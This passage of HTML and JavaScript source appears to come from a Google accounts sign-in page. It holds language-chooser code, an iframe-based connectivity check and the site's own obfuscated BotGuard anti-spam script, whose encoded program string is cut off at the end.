          <option value="pt-PT"> ‪português (Portugal)‬ </option>
          <option value="ro"> ‪română‬ </option>
          <option value="sk"> ‪Slovenčina‬ </option>
          <option value="sl"> ‪slovenščina‬ </option>
          <option value="fi"> ‪Suomi‬ </option>
          <option value="sv"> ‪Svenska‬ </option>
          <option value="vi"> ‪Tiếng Việt‬ </option>
          <option value="tr"> ‪Türkçe‬ </option>
          <option value="el"> ‪Ελληνικά‬ </option>
          <option value="bg"> ‪български‬ </option>
          <option value="mn"> ‪монгол‬ </option>
          <option value="ru"> ‪Русский‬ </option>
          <option value="sr"> ‪српски‬ </option>
          <option value="uk"> ‪Українська‬ </option>
          <option value="ka"> ‪ქართული‬ </option>
          <option value="hy"> ‪հայերեն‬ </option>
          <option value="iw"> ‫עברית‬‎ </option>
          <option value="ur"> ‫اردو‬‎ </option>
          <option value="ar"> ‫العربية‬‎ </option>
          <option value="fa"> ‫فارسی‬‎ </option>
          <option value="am"> ‪አማርኛ‬ </option>
          <option value="ne"> ‪नेपाली‬ </option>
          <option value="mr"> ‪मराठी‬ </option>
          <option value="hi"> ‪हिन्दी‬ </option>
          <option value="bn"> ‪বাংলা‬ </option>
          <option value="gu"> ‪ગુજરાતી‬ </option>
          <option value="ta"> ‪தமிழ்‬ </option>
          <option value="te"> ‪తెలుగు‬ </option>
          <option value="kn"> ‪ಕನ್ನಡ‬ </option>
          <option value="ml"> ‪മലയാളം‬ </option>
          <option value="si"> ‪සිංහල‬ </option>
          <option value="th"> ‪ไทย‬ </option>
          <option value="lo"> ‪ລາວ‬ </option>
          <option value="km"> ‪ខ្មែរ‬ </option>
          <option value="ko"> ‪한국어‬ </option>
          <option value="zh-HK"> ‪中文（香港）‬ </option>
          <option value="ja"> ‪日本語‬ </option>
          <option value="zh-CN"> ‪简体中文‬ </option>
          <option value="zh-TW"> ‪繁體中文‬ </option>
        </select>
      </span> </div>
    </div>
  </div>
  </div>
  <script>
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var appendHiddenParams = function(query) {
          var loginForm = document.getElementById('gaia_loginform');
          if (loginForm) {
            var loginInputs = loginForm.getElementsByTagName('input');
            for (var i = 0, input; input = loginInputs[i]; i++) {
              if (input.type == 'hidden' && input.value && !query[input.name]) {
                query[input.name] = input.value;
              }
            }
          }
        }
        var post = function(path, params) {
          var form = document.createElement('form');
          form.setAttribute('method', 'post');
          form.setAttribute('action', path);

          for (var key in params) {
            if (params.hasOwnProperty(key)) {
              var hiddenField = document.createElement('input');
              hiddenField.setAttribute('type', 'hidden');
              hiddenField.setAttribute('name', key);
              hiddenField.setAttribute('value', params[key]);

              form.appendChild(hiddenField);
            }
          }

          document.body.appendChild(form);
          form.submit();
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var hiddenEmailInput = document.getElementById('Email-hidden');
            if (hiddenEmailInput) {
              // If we are in password separation on password page, post to
              // /AccountLoginInfo.
              appendHiddenParams(langChooser_params);
              langChooser_params['Email'] = hiddenEmailInput.value;
              post('/AccountLoginInfo', langChooser_params);
            } else {
              var paramsStr = langChooser_getParamStr(langChooser_params);
              var newHref = langChooser_currentPath + "?" + paramsStr;
              if (langChooser_fragment) {
                newHref = newHref + "#" + langChooser_fragment;
              }
              window.location.href = newHref;
            }
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script>var G,Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gf=function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Gd(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Ge(a,b).push(d);return d},Gg=function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Gd(b);return d};a.attachEvent("on"+b,d);Ge(a,b).push(d);return d},Gh;Gh=window.addEventListener?Gf:window.attachEvent?Gg:void 0;var Gd=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1};
var Ge=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gi=function(){try{return new XMLHttpRequest}catch(c){for(var a=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],b=0;b<a.length;b++)try{return new ActiveXObject(a[b])}catch(d){}}return null},Gj=function(){this.request=Gi();this.parameters={}};
Gj.prototype.send=function(a,b){var c=[],d;for(d in this.parameters){var e=this.parameters[d];c.push(d+"="+encodeURIComponent(e))}var c=c.join("&"),f=this.request;f.open("POST",a,!0);f.setRequestHeader("Content-type","application/x-www-form-urlencoded");f.onreadystatechange=function(){4==f.readyState&&b({status:f.status,text:f.responseText})};f.send(c)};
Gj.prototype.get=function(a,b){var c=this.request;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gl=function(a){this.g=a;this.v=this.o();if(null==this.g)throw new Gk("Empty module name");};G=Gl.prototype;G.o=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
G.j=function(a,b,c){var d=this.v,e=this.g||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gj;d.parameters={};try{var e=this.j(a,b,c);d.get(e,function(){})}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};
G.warn=function(a,b){this.send("WARN",a,b)};G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gk=function(){};var Gm=Gm||new Gl("uri"),Gn=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Go=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gp=function(a,b){var c=b.match(Gn)[1]||null,d,e=b.match(Gn)[3]||null;d=e&&decodeURIComponent(e);e=Number(b.match(Gn)[4]||null)||null;if(!c||!d)return Gm.error("Invalid origin Exception",[String(b)]),!1;e||(e=Go(c));var f=a.match(Gn)[1]||null;if(!f||f.toLowerCase()!=
c.toLowerCase())return!1;c=(c=a.match(Gn)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return!1;(d=Number(a.match(Gn)[4]||null)||null)||(d=Go(f));return e==d};var Gq=Gq||new Gl("check_connection"),Gr=null,Gs=null,Gt=null,Gu=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gu.prototype;G.i=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Gq.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.h=function(a){return this.i(a,Gs)};G.w=function(a){return this.i(a,Gt)};G.m=function(a){a=a.match("^([^:]+):(\\d*):(\\d?)$");return!a||3>a.length?null:a[1]};
G.u=function(a,b){if(!Gp(this.c,a))return!1;if(this.a||!b)return!0;"accessible"==b?(this.h(a),this.a=!0):this.m(b)==this.b&&(this.w(b)||this.h(a),this.a=!0);return!0};G.s=function(){var a;a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
G.l=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.s();a.id=this.b;Gr.appendChild(a)};
var Gv=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].u(c,b);e++);}},Gw=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gr=document.getElementById(a))?(b&&(Gs=document.getElementById(b)),c&&(Gt=document.getElementById(c)),Gs||Gt?a=!0:(Gq.error("Unable to locate the input element to storeCheckConnection result",
["old id: "+String(b),"new id: "+String(c)]),a=!1)):(Gq.error("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Gq.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gu(a[d].iframeUri,a[d].domainSymbol));
Gh(window,"message",Gv(c));for(d=0;d<b;d++)c[d].l()}}}},Gx=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Gq.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Gq.f(Gw);G_setPostMessageSupportFlag=Gq.f(Gx);
</script>
  <script>
  window.__CHECK_CONNECTION_CONFIG = {
  newResultElementId: 'checkConnection',
  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\75https%3A%2F%2Faccounts.google.com\46v\0751285271566',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  connectivityElementId: 'dnConn',
  iframeParentElementId: 'cc_iframe_parent',
  postMsgSupportElementId: 'pstMsg',
  msgContent: 'accessible'
  };
  G_setPostMessageSupportFlag();
  G_checkConnectionMain();
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */(function(){eval('var w=function(f,L,x,p,C){x=f.split("."),p=M,x[0]in p||!p.execScript||p.execScript("var "+x[0]);for(;x.length&&(C=x.shift());)x.length||void 0===L?p=p[C]?p[C]:p[C]={}:p[C]=L},M=this,B=function(f,L,x){return 2>=arguments.length?Array.prototype.slice.call(f,L):Array.prototype.slice.call(f,L,x)},l=function(f,L,x){if(L=typeof f,"object"==L)if(f){if(f instanceof Array)return"array";if(f instanceof Object)return L;if(x=Object.prototype.toString.call(f),"[object Window]"==x)return"object";if("[object Array]"==x||"number"==typeof f.length&&"undefined"!=typeof f.splice&&"undefined"!=typeof f.propertyIsEnumerable&&!f.propertyIsEnumerable("splice"))return"array";if("[object Function]"==x||"undefined"!=typeof f.call&&"undefined"!=typeof f.propertyIsEnumerable&&!f.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==L&&"undefined"==typeof f.call)return"object";return L},V,I=(new function(){},function(f,L,x,p,C){for(L=[],p=x=0;p<f.length;p++)C=f.charCodeAt(p),128>C?L[x++]=C:(2048>C?L[x++]=C>>6|192:(L[x++]=C>>12|224,L[x++]=C>>6&63|128),L[x++]=C&63|128);return L}),P=function(f,L,x,p){return function(){if(!p||f.D)return g(f,f.By,arguments),g(f,f.g,x),d(f,L)}},r=function(f){for(f=0;64>f;++f);},X=function(f,L){f.C.push(f.f.slice()),f.f[f.s]=void 0,g(f,f.s,L)},J=function(f,L,x,p){if(8192>=f.length)return String.fromCharCode.apply(null,f);for(x=0,L="";x<f.length;x+=8192)p=B(f,x,x+8192),L+=String.fromCharCode.apply(null,p);return L},z=function(f){try{D(this,f)}catch(L){Q(this,L)}},g=(V=z.prototype,V.X=148,V.J=177,V.KO=42,V.P=31,V.s=239,V.b="toString",V.nO=10,V.l=250,V.j=209,function(f,L,x){if(L==f.s||L==f.N)f.f[L]?f.f[L].SQ(x):f.f[L]=h(x);else if(L!=f.i&&L!=f.J&&L!=f.Z||!f.f[L])f.f[L]=K(x,f.B);L==f.T&&(f.W=void 0,g(f,f.s,f.B(f.s)+4))}),S=(V.T=175,function(f,L,x,p){try{for(p=0;84941944608!=p;)f+=(L<<4^L>>>5)+L^p+x[p&3],p+=2654435769,L+=(f<<4^f>>>5)+f^p+x[p>>>11&3];return[f>>>24,f>>16&255,f>>8&255,f&255,L>>>24,L>>16&255,L>>8&255,L&255]}catch(C){throw C;}}),v=(z.prototype.Vx=function(f,L,x,p){try{p=f[(L+2)%3],f[L]=f[L]-f[(L+1)%3]-p^(1==L?p<<x:p>>>x)}catch(C){throw C;}},z.prototype.NH=function(f,L,x,p){if(3==f.length){for(x=0;3>x;x++)L[x]+=f[x];for(x=0,p=[13,8,13,12,16,5,3,10,15];9>x;x++)L[3](L,x%3,p[x])}},function(f,L){return f[L]<<24|f[L+1]<<16|f[L+2]<<8|f[L+3]}),A=(V.c=22,V.Z=227,V.G=218,V.i=165,V.fO=15,V.H={},V.zN=34,V.$=21,V.a=30,function(f,L,x){if(L=f.B(f.s),!(L in f.K))throw f.O(f.P),f.H;return void 0==f.W&&(f.W=v(f.K,L-4),f.F=void 0),f.F!=L>>3&&(f.F=L>>3,x=[0,0,0,f.B(f.T)],f.O5=S(f.W,f.F,x)),g(f,f.s,L+1),f.K[L]^f.O5[L%8]}),D=(V.L=132,V.w=217,function(f,L){f.f=[],g(f,f.s,0),g(f,f.N,0),g(f,f.i,[]),g(f,f.Z,[]),g(f,f.J,Y(4)),g(f,f.G,0),g(f,f.w,"object"==typeof window?window:M),g(f,f.s5,f),g(f,f.g,{}),g(f,f.T,0),g(f,f.j,[]),g(f,f.L,0),g(f,f.X,2048),g(f,f.S,f.S),f.D=true,g(f,88,function(x,f,C,L,E,t,F){f=Z(x),E=f.h,L=f.R,C=f.u,F=C.length,0==F?t=new L[E]:1==F?t=new L[E](C[0]):2==F?t=new L[E](C[0],C[1]):3==F?t=new L[E](C[0],C[1],C[2]):4==F?t=new L[E](C[0],C[1],C[2],C[3]):x.O(x.c),g(x,f.I,t)}),g(f,18,function(x){O(x,4)}),g(f,60,function(x,f,L,T,E,t){if(f=A(x),L=A(x),T=A(x),E=A(x),f=x.B(f),L=x.B(L),T=x.B(T),x=x.B(E),"object"==l(f)){for(t in E=[],f)E.push(t);f=E}for(E=0,t=f.length;E<t;E+=T)L(f.slice(E,E+T),x)}),g(f,30,function(x,f,L){f=A(x),L=A(x),g(x,L,""+x.B(f))}),g(f,65,function(x,f,L,T){f=A(x),L=A(x),T=A(x),g(x,T,x.B(f)<<L)}),g(f,81,function(x,f,L,T,E){for(f=A(x),L=A(x)<<8|A(x),T=Array(L),E=0;E<L;E++)T[E]=A(x);g(x,f,T)}),g(f,69,function(){}),g(f,111,function(x,f,L,T){f=A(x),L=A(x),T=A(x),g(x,T,x.B(f)||x.B(L))}),g(f,15,function(x,f,L){f=A(x),L=A(x),f=x.B(f),g(x,L,f)}),g(f,123,function(x){O(x,1)}),g(f,116,function(x){N(x,0)}),g(f,16,function(x,f,L){f=A(x),L=A(x),0!=x.B(f)&&g(x,x.s,x.B(L))}),g(f,19,function(x){N(x,7)}),g(f,0,function(x){G(x,1)}),g(f,106,function(x,f,L,T,E){f=A(x),L=A(x),T=A(x),f=x.B(f),E=x.B(A(x)),L=x.B(L),T=x.B(T),0!==f&&f.addEventListener(L,P(x,T,E,true),false)}),g(f,80,function(x,f,L,T){f=A(x),L=A(x),T=A(x),x.B(f)==x.B(L)&&g(x,T,x.B(T)+1)}),g(f,99,function(x,f,L,T,E,t,F,R,e){if(f=A(x),L=A(x)<<8|A(x),T="",void 0!=x.f[x.v])for(E=x.B(x.v);L--;)t=E[A(x)<<8|A(x)],T+=t;else{for(T=Array(L),E=0;E<L;E++)T[E]=A(x);for(L=[],t=E=0;E<T.length;)F=T[E++],128>F?L[t++]=String.fromCharCode(F):191<F&&224>F?(R=T[E++],L[t++]=String.fromCharCode((F&31)<<6|R&63)):(R=T[E++],e=T[E++],L[t++]=String.fromCharCode((F&15)<<12|(R&63)<<6|e&63));T=L.join("")}g(x,f,T)}),g(f,110,function(){}),g(f,45,function(x){N(x,3)}),g(f,85,function(x,f,L,T){f=A(x),L=A(x),T=A(x),g(x,T,x.B(f)>>L)}),g(f,103,function(x,f){f=x.B(A(x)),X(x,f)}),g(f,107,function(x,f,L,T){if(f=x.C.pop()){for(L=A(x);0<L;L--)T=A(x),f[T]=x.f[T];f[x.Z]=x.f[x.Z],x.f=f}else g(x,x.s,x.K.length)}),g(f,42,function(f){G(f,4)}),g(f,112,function(f,L){L=Z(f),g(f,L.I,L.h.apply(L.R,L.u))}),g(f,75,function(f,L,C){L=A(f),C=A(f),g(f,C,f.B(C)%f.B(L))}),g(f,14,function(f,L,C,T){L=A(f),C=A(f),T=A(f),C=f.B(C),L=f.B(L),g(f,T,L[C])}),g(f,46,function(f,L,C){L=A(f),C=A(f),g(f,C,f.B(C)*f.B(L))}),g(f,5,function(f,L,C,T){L=A(f),C=A(f),T=A(f),f.B(L)[f.B(C)]=f.B(T)}),g(f,34,function(f,L,C){L=A(f),C=A(f),g(f,C,f.B(C)+f.B(L))}),g(f,97,function(f,L,C,T){L=A(f),C=A(f),T=A(f),g(f,T,(f.B(L)in f.B(C))+0)}),g(f,122,function(f,L,C){L=A(f),C=A(f),g(f,C,function(f){return eval(f)}(f.B(L)))}),g(f,105,function(f){N(f,4)}),g(f,62,function(f,L,C){L=A(f),C=A(f),g(f,C,f.B(C)-f.B(L))}),g(f,90,function(f){G(f,2)}),g(f,125,function(f,L,C){L=A(f),C=A(f),L=f.B(L),g(f,C,l(L))}),g(f,9,function(f,L,C,T){L=A(f),C=A(f),T=A(f),g(f,T,f.B(L)|f.B(C))}),g(f,104,function(f,L,C,T){L=A(f),C=A(f),T=A(f),f.B(L)>f.B(C)&&g(f,T,f.B(T)+1)}),g(f,13,function(){}),g(f,21,function(f){O(f,2)}),g(f,73,function(f,L,C,T){L=A(f),C=A(f),T=f.B(A(f)),C=f.B(C),g(f,L,P(f,C,T))}),r(),L&&"!"==L.charAt(0)?f.V=L:(f.K=window.atob?n(window.atob(L)):null,f.K&&f.K.length?(f.C=[],f.o()):f.O(f.A))}),h=function(f,L,x){return x=function(){return f},L=function(){return x()},L.SQ=function(L){f=L},L},K=(V.By=134,function(f,L,x,p,C,T,E,t,F){return C=z.prototype,F=C.O,p=function(){return x()},T=C.o,E=C.m,t=z,x=function(f,e,k){for(f=p[C.U],e=f===L,k=0,f=f&&f[C.U];f&&f!=T&&f!=E&&f!=t&&f!=F&&20>k;)k++,f=f[C.U];return x[C.zN+e+!(!f+(k+3>>3))]},p[C.b]=C,x[C.M]=f,f=void 0,p}),Y=function(f,L){for(L=Array(f);f--;)L[f]=255*Math.random()|0;return L},U=(V.U="caller",V.S=204,V.A=17,z.prototype.B=function(f,L){if(L=this.f[f],void 0===L)throw this.O(this.a,0,f),this.H;return L()},V.s5=137,V.Y=33,V.v=191,V.g=201,z.prototype.U5=function(f,L){L.push(f[0]<<24|f[1]<<16|f[2]<<8|f[3]),L.push(f[4]<<24|f[5]<<16|f[6]<<8|f[7]),L.push(f[8]<<24|f[9]<<16|f[10]<<8|f[11])},V.M=36,V.eQ=12,function(f,L,x,p,C,T){for(C=f.B(L),L=L==f.J?function(L,x,p,T){if(x=C.length,p=x-4>>3,C.ZY!=p){C.ZY=p,p=(p<<3)-4,T=[0,0,0,f.B(f.L)];try{C.iX=S(v(C,p),v(C,p+4),T)}catch(e){throw e;}}C.push(C.iX[x&7]^L)}:function(f){C.push(f)},p&&L(p&255),T=0,p=x.length;T<p;T++)L(x[T])}),Q=function(f,L){f.V=("E:"+L.message+":"+L.stack).slice(0,2048)},d=function(f,L,x,p){return x=f.B(f.s),f.K&&x<f.K.length?(g(f,f.s,f.K.length),X(f,L)):g(f,f.s,L),p=f.o(),g(f,f.s,x),p},Z=(z.prototype.O=function(f,L,x,p){p=this.B(this.N),f=[f,p>>8&255,p&255],void 0!=x&&f.push(x),0==this.B(this.Z).length&&(this.f[this.Z]=void 0,g(this,this.Z,f)),x="",L&&(L.message&&(x+=L.message),L.stack&&(x+=":"+L.stack)),L=this.B(this.X),3<L&&(x=x.slice(0,L-3),L-=x.length+3,x=I(x.replace(/\\r\\n/g,"\\n")),U(this,this.J,m(x.length,2).concat(x),this.eQ)),g(this,this.X,L)},function(f,L,x,p,C,T){for(L={},x=A(f),L.I=A(f),L.u=[],p=A(f)-1,C=A(f),T=0;T<p;T++)L.u.push(A(f));for(L.h=f.B(x),L.R=f.B(C);p--;)L.u[p]=f.B(L.u[p]);return L}),m=function(f,L,x,p){for(p=L-1,x=[];0<=p;p--)x[L-1-p]=f>>8*p&255;return x},n=(V.N=216,V=z.prototype,function(f,L,x,p,C){for(L=[],p=x=0;p<f.length;p++){for(C=f.charCodeAt(p);255<C;)L[x++]=C&255,C>>=8;L[x++]=C}return L}),N=(V.d3=function(f){return(f=window.performance)&&f.now?function(){return f.now()|0}:function(){return+new Date}}(),function(f,L,x,p,C,T){p=L&3,x=L&4,C=A(f),T=A(f),C=f.B(C),x&&(C=I((""+C).replace(/\\r\\n/g,"\\n"))),p&&U(f,T,m(C.length,2)),U(f,T,C)}),O=(V.Jl=function(f,L){return L=this.m(),f&&f(L),L},V.m=function(f,L,x,p,C,T,E,t,F,R){if(this.V)return this.V;try{if(this.D=false,L=this.B(this.i).length,x=this.B(this.J).length,p=this.B(this.X),this.f[this.l]&&d(this,this.B(this.l)),C=this.B(this.Z),0<C.length&&U(this,this.i,m(C.length,2).concat(C),this.fO),T=this.B(this.G)&511,T-=this.B(this.i).length+5,E=this.B(this.J),4<E.length&&(T-=E.length+3),0<T&&U(this,this.i,m(T,2).concat(Y(T)),this.nO),4<E.length&&U(this,this.i,m(E.length,2).concat(E),this.KO),t=Y(2).concat(this.B(this.i)),t[1]=t[0]^3,F=window.btoa?window.btoa(J(t)).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,""):void 0,F)F="!"+F;else for(C=0,F="";C<t.length;C++)R=t[C][this.b](16),1==R.length&&(R="0"+R),F+=R;this.B(this.i).length=L,this.B(this.J).length=x,g(this,this.X,p),f=F,this.D=true}catch(e){Q(this,e),f=this.V}return f},function(f,L,x,p){for(x=A(f),p=0;0<L;L--)p=p<<8|A(f);g(f,x,p)}),G=function(f,L,x,p){x=A(f),p=A(f),U(f,p,m(f.B(x),L))};V.cy=function(f,L,x,p){for(p=x=0;p<f.length;p++)x+=f.charCodeAt(p),x+=x<<10,x^=x>>6;return x+=x<<3,x^=x>>11,(x+(x<<15)>>>0)%L},V.Hy=function(f,L,x,p,C,T){for(x=[],T=p=0;T<f.length;T++)for(C=C<<L|f[T],p+=L;7<p;)p-=8,x.push(C>>p&255);return x},V.o=function(f,L,x,p,C,T){try{for(p=0,L=5001,x=void 0,f=this.K.length;--L&&(p=this.B(this.s))<f;)try{g(this,this.N,p),C=A(this),(x=this.B(C))&&x.call?x(this):this.O(this.$,0,C)}catch(E){E!=this.H&&(T=this.B(this.S),T!=this.S?(g(this,T,E),g(this,this.S,this.S)):this.O(this.c,E))}L||this.O(this.Y)}catch(E){try{this.O(this.c,E)}catch(t){Q(this,t)}}return this.B(this.g)},V.XF=function(f,L,x){return L^=L<<13,L^=L>>17,(L=(L^L<<5)&x)||(L=1),f^L},V.uX=function(f,L,x,p){for(p=0,x=2166136261;p<f.length;p++)x^=f.charCodeAt(p),x+=(x<<1)+(x<<4)+(x<<7)+(x<<8)+(x<<24);return x&L};try{window.addEventListener("unload",function(){},false)}catch(f){}w("botguard.bg",z),w("botguard.bg.prototype.invoke",z.prototype.Jl);')})()</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('2geQQXJiPIdIrMJtpQPQrMh5Lp8SWyfVyjLAX0KSyLLq1DIw5wguwJNsVYovGidnof57R5ayhb00V5YftS5vXv1ZYAJMrGINTrzV95TEy8iYv/ak7UAnFtEcgmbi4teKUn9E5vT47xpAHDeEWeUlt+eccZitwnLLt1NyGn71B88MWCrjDWGcdufSZScrPHhAaRAwFpUmLcjvzpUQR3WmHsHqDmTAexg+FJq23OLvSipUaHHV6XHcNKoAYvxfzfZdHdTGFxOg7L8SqLch4zJgvnb3WqsXogf7ICIYLPIPs0Ij/z4ppwg65W7He5mnxk2JThziBVgxCeTy+HeRHMvg4nPBMuAQyaKNRLw7tzj3p3j1+JCinZTexKI9B15xeSi8O380NfX8hHkCHpVrbwhmPAKpTWRHu2s1YSxVGgVABiRWNPZDfOVTDYrHCM8eLS/xkxv4aiLZyfkxz/EIJG5zSl2FSacGrqr8Nfp3CPfJuAyqpPRkb9O5e/bdFySbyhmNjkgcrppW5e4lz58kxuXSX8bMb6vhJ0SMMoqcIj/qtPP2CmSMVPAs7M6chgf4h4WOe0Dhb8QofI6T7xb+Vg2aqSPAktvT+yTW1/wWI/roqJAp9ILiT5znQwloHTIpDxb83TRxQonVNiKp5rA++ID+WzKCndU0/P1w3IBdnO9V3bL7UNZa1KxP5vP64QsNKKgmi2vsFSKor72KF1t8ntAxuqCNdwq+ETC+zmOA/V+REDeSRQhck4XCKs6TywhVZYkKkjjRf0O39gTic85pITTkGlBLx/DoR+Bh1VZVhx7+UKqtXSq7M3x89fraa6JQ7JgYO0j+W84lvZxz0CjPP65tp0fLbVuwCypDQ4y64s5HlEcJUE5M2zW6qcc85rmLB/Ue+2FNbm1+ViET3XHtI/0rB2s5PR4mMb13wqYA8srgw/b+0vxgzKN7A131OqEoM2QKGa5EFMSpJWAQvJHsoCwKw8ktvsaT0B1soobTOpSxfhlQX2TPn5zg7/LR95uhmZvDKfN2IAeoGl7tYfCUmT9EQ0S0bQFSHc3S7Oo2fOzg6Daono9jFwGzxytqiuBFZ2k1OOSnQ+X6BrzKK30h50ySiKJwfJinOqfPlXdCD0HExpfNeJAnIzlS/vm7OdWpEYwWzaZP+N10Ktiys4IppFi0wk7YvbPadfasKOlV7b6Vo4cYcA12zVyn/3fBTF8JzKl/A+MfshFs/0YiYmcRBNGIQ47XFAQ+Dypa8mcrvSDtgfaRuKK97jW3FxdO9YdGdFYG9QRcFvLHChgPzi+1EJ5LkfGEXrP9t1fRLu1G/eRaRWiKCt8x5danVomhi/W56DC0TWtTNXCA9H8xIeAE9m9Liw78Tw1mw4rvwgMEEO0tdS+5ech3JH1ObNVJEYpfLJxyCt7TS8vRGMyXJA34bXH9ftp8DB3TNBolS+1HxDcitCBX1uGxqo0UUiS6r2YSzEYLtARJSa2nSXkh1ceqhVG5nhjElhyp6t0YOv+uNn9xrCSKj5pEAeVsBSXBhmEuqTSYZt9OrwFVhbMrTGM+e0a25v05gg8JvtTItXfFdbsjJSEMcZnzDySyk4fLwF9PAfR1W/4tNCRtNzehl+Vr6WCs5l3Fn3EF1rTt+Tgh+iGhyS+tJSG9sYuKb6zwKViiNRL0EBk6yISr8kPj+R8KODdd5C1zce0/Q1S+IQ2rcBJe6oxCAEmugiCxjhk7EvFBAR7JJtVYR/4OJoXraR9RMBKshI4oMpo1vlqeLCGHu3X2OSqR8rn+efGKCoxVQzRuv3YK447CFQBB7EBr80cIpLNsAcdfHtdSz1dtpSxMv8qo53ugdqE6zIzaSG5X+M357hwCL2jcn2hizB83Stij7wRiQ8RfNjfA4prE0/8bXmWu4Z/61Xe8RE8eVbJN3t8GYM3OuodK6udzMDE7GVHu1U7DZVzczZvANWiyOTcXPEUMPat109s39V8VisuACojBlPi4mpK2kBvPtOXG2bT8Aq580TTV7hQOmpLbl6FSeIH4dgQjnJO/O6JvGsXfudxkCSk14t6LmvjYOJ82hyKxBI7hDpyNEvM/k3lyOixnV2ehnAt3obgrAlU16XHdmLPkmOxZD5fd2qdm4+vSirDsXtKWFXCEjeh0+iS7I3StyhH5nyaGYyIZuFWHUg9hfj0SITheFP7aqR7Zn6+Wxm7JfT+VR7HuAmLMVzLq7KJrWYLxeU+vZKC+4Uz85eBrqG0D9rKyo2ZGGulYKj4QjuycMuM2qpmitMGd4GNjiP8k5omU/D0+FLWfU0wSrDnxW98nbeV7bBUOVIvbfV2qTU5PsMV9nRP3DHk+k7eaqB7A5NijQfZt3al/yPqLJHe5TQDXwdtQD9